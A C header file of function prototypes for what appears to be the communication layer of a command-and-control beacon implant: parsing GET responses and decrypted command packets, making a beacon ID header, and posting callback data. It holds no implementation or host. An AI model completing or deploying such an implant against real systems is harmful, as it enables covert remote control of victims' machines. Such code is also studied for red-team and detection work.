#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "Command.h"

unsigned char* parseGetResponse(unsigned char* data, size_t dataSize, size_t* responsedatalen);
unsigned char* parsePacket(unsigned char* decryptedBuf, uint32_t* totalLen, uint32_t* commandType, size_t* commandBuflen , size_t* jia);
unsigned char* GET(unsigned char* cookie_header, size_t* responseSize);
unsigned char* makeBeaconIdHeader();
unsigned char* makePostData(unsigned char* buff, size_t Bufflen, int callback);
VOID POST(unsigned char* buff, size_t Bufflen, int callback);